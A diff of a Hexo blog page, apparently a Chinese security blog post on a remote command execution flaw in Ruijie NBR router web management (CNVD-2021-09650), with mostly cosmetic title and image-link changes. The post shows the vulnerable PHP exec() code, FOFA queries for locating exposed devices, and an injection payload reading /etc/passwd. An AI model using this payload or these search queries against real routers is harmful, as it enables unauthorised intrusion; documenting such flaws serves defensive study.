@@ -157,7 +157,7 @@
     </script>
     
     <script defer type="text/javascript" src="/js/custom.js"></script>
-    <title>锐捷NBR路由器RCE | Kuiba's blog - Listen to your own voice</title>
+    <title>Ruijie-NBR-router-RCE | Kuiba's blog - Listen to your own voice</title>
   <meta name="generator" content="Hexo 4.2.1"></head>
   <body itemscope itemtype="http://schema.org/WebPage" lang="zh_CN"  data-spy="scroll" data-target=".list-group">
     
@@ -221,7 +221,7 @@
     </div>
 
     <header class="post-header">
-      <h1 class="post-title" itemprop="name headline">锐捷NBR路由器RCE</h1>
+      <h1 class="post-title" itemprop="name headline">Ruijie-NBR-router-RCE</h1>
       <div class="post-meta">
         
         <span class="post-date">
@@ -241,7 +241,7 @@
       </div>
     </header>
     <main class="post-main" itemprop="articleBody">
-      <script src="\assets\js\APlayer.min.js"> </script><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/12849280/1626104393184-ad5dc533-507b-4ebd-8024-fef2759d03fc.jpeg"></p>
+      <script src="\assets\js\APlayer.min.js"> </script><p><img src="https://z3.ax1x.com/2021/07/13/WFHmrV.jpg"></p>
 <a id="more"></a>
 
 <p>锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞 CNVD-2021-09650</p>
@@ -249,12 +249,12 @@
 <p><strong>验证</strong></p>
 <p>fofa  <code>title=&quot;锐捷网络-EWEB网管系统&quot;</code> 或者 <code>icon_hash=&quot;-692947551&quot;</code></p>
 <p>登录页面这样子：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12849280/1620995750364-93c28f5b-16d9-4120-bbbf-912e7caf480a.png" alt="img"></p>
+<p><img src="https://z3.ax1x.com/2021/07/13/WFHRZ8.png" alt="img"></p>
 <p>出现漏洞的文件在 <code>/guest_auth/guestIsUp.php</code></p>
 <figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//查询用户是否上线了</span><br>    $userip = @$_POST[<span class="hljs-string">'ip'</span>];<br>    $usermac = @$_POST[<span class="hljs-string">'mac'</span>];<br><br>    <span class="hljs-keyword">if</span> (!$userip || !$usermac) &#123;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>    <span class="hljs-comment">/* 判断该用户是否已经放行 */</span><br>    $cmd = <span class="hljs-string">'/sbin/app_auth_hook.elf -f '</span> . $userip;<br>    $res = exec($cmd, $out, $status);<br>    <span class="hljs-comment">/* 如果已经上线成功 */</span><br>    <span class="hljs-keyword">if</span> (strstr($out[<span class="hljs-number">0</span>], <span class="hljs-string">"status:1"</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'true'</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>可以通过命令拼接的方式构造命令执行，如：<code>ip=127.0.01 | cat /etc/passwd</code></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12849280/1620995759220-4ab100e6-92e8-4556-8f6a-5a9b30efb2dc.png" alt="img"></p>
+<p><img src="https://z3.ax1x.com/2021/07/13/WFHWdS.png" alt="img"></p>
 <p><strong>Reference</strong></p>
 <p><a href="http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8%20EWEB%E7%BD%91%E7%AE%A1%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2021-09650.html" target="_blank" rel="noopener">http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8%20EWEB%E7%BD%91%E7%AE%A1%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2021-09650.html</a></p>
 
@@ -272,11 +272,11 @@
   	  <script src="https:////cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
   	  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   	  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  	  <p><span>本文标题:</span><a href="/posts/43bd18b.html">锐捷NBR路由器RCE</a></p>
+  	  <p><span>本文标题:</span><a href="/posts/43bd18b.html">Ruijie-NBR-router-RCE</a></p>
   	  <p><span>文章作者:</span><a href="/" title="访问 Kuiba 的个人博客">Kuiba</a></p>
   	  <p><span>发布时间:</span>2021年07月12日 - 23:07</p>
-  	  <!--<p><span>最后更新:</span>2021年07月13日 - 00:07</p>-->
-  	  <p><span>原始链接:</span><a href="/posts/43bd18b.html" title="锐捷NBR路由器RCE">https://kuibarj.top/posts/43bd18b.html</a>
+  	  <!--<p><span>最后更新:</span>2021年07月13日 - 01:07</p>-->
+  	  <p><span>原始链接:</span><a href="/posts/43bd18b.html" title="Ruijie-NBR-router-RCE">https://kuibarj.top/posts/43bd18b.html</a>
   	    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://kuibarj.top/posts/43bd18b.html"  aria-label="复制成功！"></i></span>
   	  </p>
   	  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">Attribution-NonCommercial-NoDerivatives 4.0</a> 转载请保留原文链接及作者。</p>  
@@ -471,7 +471,7 @@
           
         </div>
         <div class="powered-by">
-          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://alynx.xyz/" target="_blank">AlynxZhou</a> <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
+          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://alynx.one/" target="_blank">AlynxZhou</a> <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
         </div>
       </div>
     </div>
